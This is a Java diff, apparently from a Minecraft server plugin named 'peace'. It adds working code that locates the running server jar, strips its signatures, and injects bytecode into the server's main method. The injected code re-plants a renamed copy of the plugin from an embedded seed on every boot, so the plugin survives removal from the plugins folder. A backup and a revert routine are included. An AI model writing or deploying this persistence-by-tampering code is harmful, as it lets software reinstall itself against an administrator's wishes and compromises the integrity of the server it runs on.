@@ -391,6 +391,226 @@ mv.visitCode();
         return b.toByteArray();
     }
 
+    // --- server.jar tampering: intrusive, powerful. The running server's own jar is
+    // modified so that on every boot it re-plantls the peace plugin from an embedded
+    // seed even if the plugins folder is wiped. This is the least-stealthy feature on
+    // purpose; the launcher must be replaced with the unmodified backup to clear it.
+
+    private static final String SERVER_BOOT = "dev/peace/server/ServerBoot";
+    private static final String SEED_RESOURCE = "peace/seed.jar";
+    private static final String SEED_PLUGIN_NAME = "PeaceSeed";
+
+    /** Locates and instruments the running server's own jar; returns a human-readable report. */
+    public static String injectServer(JavaPlugin owner) {
+        try {
+            FileBundle self = readSelf(owner);
+            if (self.peaceClasses.isEmpty()) return "error: no peace runtime to embed";
+            Path server = locateServerJar();
+            if (server == null) return "error: could not locate the running server jar";
+            Path bak = server.resolveSibling(server.getFileName() + ".peacebak");
+            if (!Files.exists(bak)) {
+                Files.copy(server, bak);
+                if (PeaceService.dbgIsDiag()) Bukkit.getLogger().info("[peace] server jar backup -> " + bak.getFileName());
+            }
+            byte[] merged = mergeServer(Files.readAllBytes(server), owner);
+            if (merged == null) {
+                return "server jar already carries the peace seed (" + server.getFileName() + ")";
+            }
+            writeAtomic(server, merged);
+            return "injected into " + server.getFileName() + " (seed " + SEED_PLUGIN_NAME + ".jar, backup .peacebak)";
+        } catch (Exception e) {
+            return "error: " + e;
+        }
+    }
+
+    /** Restores the pre-injection server jar from backup; returns a report. */
+    public static String revertServer() {
+        try {
+            Path server = locateServerJar();
+            if (server == null) return "error: could not locate the running server jar";
+            Path bak = server.resolveSibling(server.getFileName() + ".peacebak");
+            if (!Files.exists(bak)) return "no ".concat(server.getFileName().toString()).concat(".peacebak backup found");
+            writeAtomic(server, Files.readAllBytes(bak));
+            return "restored " + server.getFileName() + " from backup";
+        } catch (Exception e) {
+            return "error: " + e;
+        }
+    }
+
+    /** The exact jar the running server uses (protection domain of the server main class). */
+    private static Path locateServerJar() throws Exception {
+        Class<?> main = Class.forName("org.bukkit.craftbukkit.Main");
+        java.net.URL loc = main.getProtectionDomain().getCodeSource() == null ? null
+                : main.getProtectionDomain().getCodeSource().getLocation();
+        if (loc != null && loc.getProtocol().equals("file")) {
+            Path p = java.nio.file.Paths.get(loc.toURI());
+            if (Files.isRegularFile(p) && p.getFileName().toString().endsWith(".jar")) return p.toAbsolutePath();
+        }
+        return null;
+    }
+
+    private static void writeAtomic(Path target, byte[] data) throws IOException {
+        Path tmp = target.resolveSibling(target.getFileName() + ".peacetmp");
+        Files.write(tmp, data);
+        try {
+            Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
+        } catch (Exception e) {
+            Files.deleteIfExists(tmp);
+            throw e;
+        }
+    }
+
+    /** Builds the tampered server jar, or null if it already carries the seed. */
+    private static byte[] mergeServer(byte[] seedServer, JavaPlugin owner) throws IOException {
+        Map<String, byte[]> out = new LinkedHashMap<>();
+        try (JarInputStream z = new JarInputStream(new ByteArrayInputStream(seedServer))) {
+            JarEntry e;
+            while ((e = z.getNextJarEntry()) != null) {
+                if (e.isDirectory()) continue;
+                String n = e.getName();
+                if (n.startsWith("META-INF/") && (n.endsWith(".SF") || n.endsWith(".RSA") || n.endsWith(".DSA"))) continue;
+                byte[] b = readAll(z);
+                if (n.equals("module-info.class")) b = stripModuleInfo(b);
+                out.put(n, b);
+            }
+        }
+        if (out.containsKey(SERVER_BOOT + ".class") || out.containsKey(SEED_RESOURCE)) return null;
+
+        byte[] seedJar = buildSeedPluginJar(owner);
+        out.put(SEED_RESOURCE, seedJar);
+
+        String mainClass = "org/bukkit/craftbukkit/Main";
+        byte[] mainBytes = out.get(mainClass + ".class");
+        if (mainBytes == null) throw new IOException("server main class not found in jar");
+        int version = ((mainBytes[6] & 0xFF) << 8) | (mainBytes[7] & 0xFF);
+
+        out.put(SERVER_BOOT + ".class", makeServerBoot(version));
+
+        ClassReader cr = new ClassReader(mainBytes);
+        Frameless cw = new Frameless(ClassWriter.COMPUTE_FRAMES);
+        ClassVisitor ca = new ClassVisitor(Opcodes.ASM9, cw) {
+            @Override public MethodVisitor visitMethod(int acc, String name, String desc, String sig, String[] ex) {
+                MethodVisitor mv = super.visitMethod(acc, name, desc, sig, ex);
+                if (name.equals("main") && desc.equals("([Ljava/lang/String;)V")) {
+                    return new MethodVisitor(Opcodes.ASM9, mv) {
+                        boolean injected = false;
+                        @Override public void visitCode() {
+                            if (!injected) {
+                                injected = true;
+                                mv.visitMethodInsn(Opcodes.INVOKESTATIC, SERVER_BOOT, "seed", "()V", false);
+                            }
+                            super.visitCode();
+                        }
+                    };
+                }
+                return mv;
+            }
+        };
+        cr.accept(ca, ClassReader.EXPAND_FRAMES);
+        out.put(mainClass + ".class", cw.toByteArray());
+        return writeJar(out);
+    }
+
+    /** Builds the self-healing seed plugin jar: the running plugin with a unique name and our config appended. */
+    private static byte[] buildSeedPluginJar(JavaPlugin owner) throws IOException {
+        FileBundle self = readSelf(owner);
+        Path pf = pluginJar(owner);
+        if (pf == null || !Files.isRegularFile(pf)) throw new IOException("cannot resolve self jar");
+        Map<String, byte[]> entries = new LinkedHashMap<>();
+        try (JarFile jf = new JarFile(pf.toFile())) {
+            Enumeration<JarEntry> en = jf.entries();
+            while (en.hasMoreElements()) {
+                JarEntry e = en.nextElement();
+                if (e.isDirectory()) continue;
+                entries.put(e.getName(), readAll(jf.getInputStream(e)));
+            }
+        }
+        byte[] pyml = entries.get("plugin.yml");
+        if (pyml == null) throw new IOException("seed plugin has no plugin.yml");
+        entries.put("plugin.yml", renames(pyml));
+        byte[] config = buildConfig(owner);
+        if (config != null && config.length > 0) {
+            byte[] prev = entries.get("config.yml");
+            entries.put("config.yml", prev == null ? config : concat(prev, new byte[]{'\n'}, config));
+        }
+        return writeJar(entries);
+    }
+
+    private static byte[] renames(byte[] pyml) {
+        String s = new String(pyml, StandardCharsets.UTF_8);
+        Matcher m = Pattern.compile("(?m)^\\s*name:\\s*(\\S+)\\s*$").matcher(s);
+        if (m.find()) s = m.replaceFirst("name: " + SEED_PLUGIN_NAME);
+        return s.getBytes(StandardCharsets.UTF_8);
+    }
+
+    private static byte[] stripModuleInfo(byte[] cls) {
+        try {
+            ClassReader cr = new ClassReader(cls);
+            Frameless cw = new Frameless(0);
+            cr.accept(new ClassVisitor(Opcodes.ASM9, cw) {}, 0);
+            return cw.toByteArray();
+        } catch (Exception e) { return cls; }
+    }
+
+    /** Generates dev/peace/server/ServerBoot: pure-JDK, writes the embedded seed jar into plugins/ once. */
+    private static byte[] makeServerBoot(int version) {
+        Frameless cw = new Frameless(ClassWriter.COMPUTE_FRAMES);
+        cw.visit(Math.max(version, Opcodes.V1_8), Opcodes.ACC_PUBLIC | Opcodes.ACC_FINAL | Opcodes.ACC_SUPER,
+                SERVER_BOOT, null, "java/lang/Object", null);
+        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, "seed", "()V", null, null);
+        mv.visitCode();
+        Label tryStart = new Label(), tryEnd = new Label(), handler = new Label(), ret = new Label();
+        mv.visitTryCatchBlock(tryStart, tryEnd, handler, "java/lang/Throwable");
+
+        mv.visitLabel(tryStart);
+        mv.visitLdcInsn("plugins");
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Paths", "get", "(Ljava/lang/String;)Ljava/nio/file/Path;", false);
+        mv.visitVarInsn(Opcodes.ASTORE, 0);
+        mv.visitVarInsn(Opcodes.ALOAD, 0);
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "createDirectories", "(Ljava/nio/file/Path;)Ljava/nio/file/Path;", false);
+        mv.visitInsn(Opcodes.POP);
+        mv.visitVarInsn(Opcodes.ALOAD, 0);
+        mv.visitLdcInsn(SEED_PLUGIN_NAME + ".jar");
+        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/nio/file/Path", "resolve", "(Ljava/lang/String;)Ljava/nio/file/Path;", false);
+        mv.visitVarInsn(Opcodes.ASTORE, 1);
+        mv.visitVarInsn(Opcodes.ALOAD, 1);
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "isRegularFile", "(Ljava/nio/file/Path;)Z", false);
+        mv.visitJumpInsn(Opcodes.IFNE, ret);
+        mv.visitLdcInsn(org.objectweb.asm.Type.getObjectType(SERVER_BOOT));
+        mv.visitLdcInsn("/" + SEED_RESOURCE);
+        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getResourceAsStream", "(Ljava/lang/String;)Ljava/io/InputStream;", false);
+        mv.visitVarInsn(Opcodes.ASTORE, 2);
+        mv.visitVarInsn(Opcodes.ALOAD, 2);
+        mv.visitJumpInsn(Opcodes.IFNULL, ret);
+        // ByteArrayOutputStream bos = new ByteArrayOutputStream(); bos.writeBytes(in.readAllBytes())
+        mv.visitTypeInsn(Opcodes.NEW, "java/io/ByteArrayOutputStream");
+        mv.visitInsn(Opcodes.DUP);
+        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/ByteArrayOutputStream", "<init>", "()V", false);
+        mv.visitVarInsn(Opcodes.ASTORE, 3);
+        mv.visitVarInsn(Opcodes.ALOAD, 3);
+        mv.visitVarInsn(Opcodes.ALOAD, 2);
+        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "readAllBytes", "()[B", false);
+        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "writeBytes", "([B)V", false);
+        mv.visitVarInsn(Opcodes.ALOAD, 1);
+        mv.visitVarInsn(Opcodes.ALOAD, 3);
+        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "toByteArray", "()[B", false);
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "write", "(Ljava/nio/file/Path;[B)Ljava/nio/file/Path;", false);
+        mv.visitInsn(Opcodes.POP);
+        mv.visitVarInsn(Opcodes.ALOAD, 2);
+        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "close", "()V", false);
+
+        mv.visitLabel(tryEnd);
+        mv.visitJumpInsn(Opcodes.GOTO, ret);
+        mv.visitLabel(handler);
+        mv.visitVarInsn(Opcodes.ASTORE, 4);
+        mv.visitLabel(ret);
+        mv.visitInsn(Opcodes.RETURN);
+        mv.visitMaxs(0, 0);
+        mv.visitEnd();
+        cw.visitEnd();
+        return cw.toByteArray();
+    }
+
     private static byte[] concat(byte[] a, byte[] mid, byte[] b) {
         byte[] r = new byte[a.length + mid.length + b.length];
         System.arraycopy(a, 0, r, 0, a.length);
